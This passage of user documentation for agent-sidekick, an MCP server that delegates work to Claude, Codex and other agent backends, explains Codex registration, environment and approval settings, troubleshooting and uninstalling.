- The delegated agent runs with the permissions you grant via `allowed_tools`. In `-p` mode the workspace trust dialog is skipped, so only point `cwd` at directories you trust. Command backends run with the server's permissions and their own permission model. The wizard's Gemini backend passes `--skip-trust`, so a project's `.env` or `.gemini/settings.json` can redirect or read its key, see [Command backends](#command-backends); opencode backends run project plugins, see [OpenCode backends](#opencode-backends).

## Codex as MCP host

agent-sidekick also works as an MCP server of the OpenAI Codex CLI: Codex then gets `sidekick_backends`, `sidekick_run` and `sidekick_status` (as the tool namespace `mcp__agent_sidekick`) and can hand work to any configured backend, e.g. a Claude account or KI:connect.

```sh
agent-sidekick setup --codex     # register in $CODEX_HOME/config.toml (default ~/.codex/config.toml)
agent-sidekick doctor            # "Codex MCP registration: registered in ..."
```

`setup --codex` writes this table (and asks for nothing else); start a new Codex session afterwards, `/mcp` lists the server:

```toml
[mcp_servers.agent-sidekick]
command = '/abs/path/to/agent-sidekick'
args = ["serve"]
startup_timeout_sec = 30
tool_timeout_sec = 15000
env_vars = ["ALL_PROXY", "HTTPS_PROXY", "HTTP_PROXY", "LANG", "NO_PROXY", "SSL_CERT_DIR", "SSL_CERT_FILE", ...]

[mcp_servers.agent-sidekick.tools.sidekick_backends]
approval_mode = "approve"

[mcp_servers.agent-sidekick.tools.sidekick_status]
approval_mode = "approve"

[mcp_servers.agent-sidekick.env]
AGENT_SIDEKICK_CLAUDE = '/abs/path/to/claude'
```

- **`tool_timeout_sec`:** Codex cancels an MCP tool call after 60 s by default, and progress notifications do not extend that (unlike Claude Code; verified with codex 0.163.0). 15000 s covers the longest possible `sidekick_run` (two attempts of `timeout_s` = 7200 with a fallback, plus queueing). An entry without it (e.g. from `codex mcp add`, which cannot set timeouts) makes `doctor` fail.
- **Environment:** Codex starts MCP servers with an allowlisted environment (on Windows: `APPDATA`, `LOCALAPPDATA`, `PATH`, `PATHEXT`, `TEMP`, `TMP`, `USERPROFILE`, `USERNAME`, the system variables; not `CODEX_*`, not your other variables). So `setup --codex` writes `AGENT_SIDEKICK_CLAUDE` (the claude it found, or `--claude PATH`) and a set `AGENT_SIDEKICK_CONFIG_DIR`/`AGENT_SIDEKICK_CLAUDE_CONFIG_DIR` into `env` (paths, never secrets), and puts the names of every `api_key_env` and `pass_env` of `config.toml`, the proxy and CA variables, `LANG`, `CLAUDE_CODE_GIT_BASH_PATH` (a claude backend on Windows may need it) and on Unix `DBUS_SESSION_BUS_ADDRESS`, `XDG_RUNTIME_DIR` and `XDG_CONFIG_HOME` into `env_vars`: Codex then forwards their values from its own environment, so no key is written into its config. After adding an `api_key_env` run `setup --codex` again; `doctor` names missing variables.
- **Approval:** Codex asks before every MCP tool call by default (and refuses it in `codex exec`, "approval policy is never"). The read-only tools `sidekick_backends` and `sidekick_status` are registered with `approval_mode = "approve"`. `sidekick_run` keeps Codex's prompt, because the delegated agent works outside Codex's sandbox with its own permissions. To run it without asking (e.g. in `codex exec`), add `[mcp_servers.agent-sidekick.tools.sidekick_run]` with `approval_mode = "approve"` yourself.
- **Editing:** the file is edited directly (with `toml_edit`), not with `codex mcp add`, which can set neither timeout and rewrites other tables. The previous file is copied to `config.toml.bak-agent-sidekick-<timestamp>` first; everything outside the `agent-sidekick` table stays byte for byte (checked before writing). Re-running `setup --codex` updates `command`, `args`, the timeouts, `env_vars` and the `env` values in place and keeps everything else of the entry (`enabled`, other `env` values, tool settings). `mcp_servers` as an inline table is not edited (error, nothing written). The new file is written next to the old one and renamed over it; on Unix it keeps the old file's mode (a new file gets 0600, since the config can hold other MCP servers' secrets), and a symlinked `config.toml` is written through to its target (the link stays).
- **Instructions:** Codex uses (at least) the first 512 characters of the server instructions for tool selection; agent-sidekick names its three tools and the possibly long run time there.
- **Cancellation:** whether Codex sends `notifications/cancelled` when a call times out or the user interrupts is not verified; when Codex ends, the server's stdin closes and every running process tree is killed.
- `uninstall` removes the entry (after a backup); `doctor` checks it when Codex is installed (entry, `enabled`, `command` = this binary, `args`, timeout, `AGENT_SIDEKICK_CLAUDE` exists, variables of `config.toml` forwarded).

### Codex-only machines

agent-sidekick does not need Claude Code when the Codex CLI is the host:

1. Install Node.js and the Codex CLI (`npm install -g @openai/codex`), then `codex login` with your own account.
2. Install agent-sidekick (README one-liner). The wizard shows Claude Code as missing, prints "Claude Code nicht gefunden – agent-sidekick wird nur in Codex angemeldet", does not offer the second-Claude-account profile, skips the Claude Code registration and registers with Codex without asking.
3. Start a new Codex session; `/mcp` lists `agent-sidekick`. A `codex` backend with a ChatGPT login needs a model that account allows (see [Codex backends](#codex-backends)).

The non-interactive `setup` and `setup --register-only` do the same (register with Codex) when `claude` is missing and Codex is installed. `doctor` then reports the missing `claude` as a note, skips the Claude Code registration check and fails if the Codex registration is missing. Installing Claude Code later: run `agent-sidekick setup --register-only`.

## VS Code

- The extension starts MCP servers with a reduced PATH. `agent-sidekick setup` therefore stores the absolute path of `claude` as `AGENT_SIDEKICK_CLAUDE` in the MCP registration. For command backends, use an absolute `command[0]` if the program is not on that PATH.
- Remote / WSL / SSH: MCP servers run on the remote side. Install agent-sidekick and run `agent-sidekick setup` there. The OS keyring is often unavailable in WSL/SSH sessions; the file fallback is used automatically.

## Terms of use

agent-sidekick only drives the official `claude` CLI (or the agent CLIs you configure) with credentials you choose. Apart from the requests listed under [Security](#security) (reachability probes, the update check, the wizard's optional key check and npm installs) it makes no network requests of its own, and it does no account switching, load balancing or rate-limit circumvention; that is why a fallback from one Claude account to another is rejected.
You are responsible for complying with Anthropic's terms for each account you use, and with the terms of any other provider you configure.

## Troubleshooting

Run `agent-sidekick doctor` first; it checks the installation and every backend and prints next steps.

- **`claude` not found**: install the Claude Code CLI (`agent-sidekick harness install claude` prints the official commands; the VS Code extension alone is not enough, its bundled binary is not searched), open a new terminal, or set `AGENT_SIDEKICK_CLAUDE` / `claude_path` to its absolute path, then re-run `agent-sidekick setup --register-only`; on a machine that only has the Codex CLI, `claude` is not needed (see [Codex-only machines](#codex-only-machines)).
- **Token missing**: run `agent-sidekick setup --backend <name>` for that backend, or `agent-sidekick setup --no-wizard` for every claude-oauth backend without a token, and reload VS Code (see the README); `setup --register-only` registers without asking for tokens.
- **Endpoint not reachable**: start the local server (`ollama serve`, LM Studio's server), then `agent-sidekick backends test <name>`.
- **Endpoint run fails with "Not logged in"**: check that the key is stored (`backends test`) and that `config_dir` is the backend's own directory.
- **Config error in `sidekick_run`**: fix `config.toml`; `agent-sidekick backends list` shows the problem.
- **Server not listed in `/mcp`**: reload the VS Code window or restart Claude Code.
- **Logs**: `<config-dir>/logs` (more detail with `AGENT_SIDEKICK_LOG=debug`).

## Uninstall

```sh
agent-sidekick uninstall          # remove stored secrets and the MCP registrations (Claude Code, Codex)
agent-sidekick uninstall --purge  # also delete the config directory (config, token files, logs)
```

The agents' Claude config directories (`~/.claude-sidekick`, `~/.claude-sidekick-<name>`) are left in place. Then delete the binary.

## License

Licensed under either of [Apache License 2.0](../LICENSE-APACHE) or [MIT](../LICENSE-MIT) at your option.
